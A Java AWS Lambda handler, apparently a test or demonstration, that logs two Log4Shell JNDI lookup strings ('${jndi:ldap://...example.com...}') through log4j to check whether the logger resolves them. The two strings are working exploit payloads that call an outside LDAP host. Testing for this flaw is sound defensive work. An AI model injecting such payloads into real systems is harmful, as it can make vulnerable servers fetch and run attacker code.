/**
 * Created by gaige on 6/17/22.
 */

import com.amazonaws.services.lambda.runtime.Context;
import com.amazonaws.services.lambda.runtime.RequestHandler;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.Map;

public class log4jExample implements RequestHandler<Map<String,String>, String>{

    private static final Logger logger = LogManager.getLogger(log4jExample.class);

    public String handleRequest(Map<String,String> event, Context context) {
        String dnsBad= "${jndi:ldap://fo22o.example.com:1039/a}";
        String ldapBad="${jndi:ldap://foo.bar.example.com:8055/a}";

        logger.error(dnsBad);
        logger.error(ldapBad);
        logger.error("Hello from Log4j 2");
        return "Yep";
    }

    public static void main(String[] args) {
        String dnsBad= "${jndi:ldap://fo22o.example.com:1039/a}";
        String ldapBad="${jndi:ldap://foo.bar.example.com:8055/a}";

        logger.error(dnsBad);
        logger.error(ldapBad);
        logger.error("Hello from Log4j 2");

    }
}
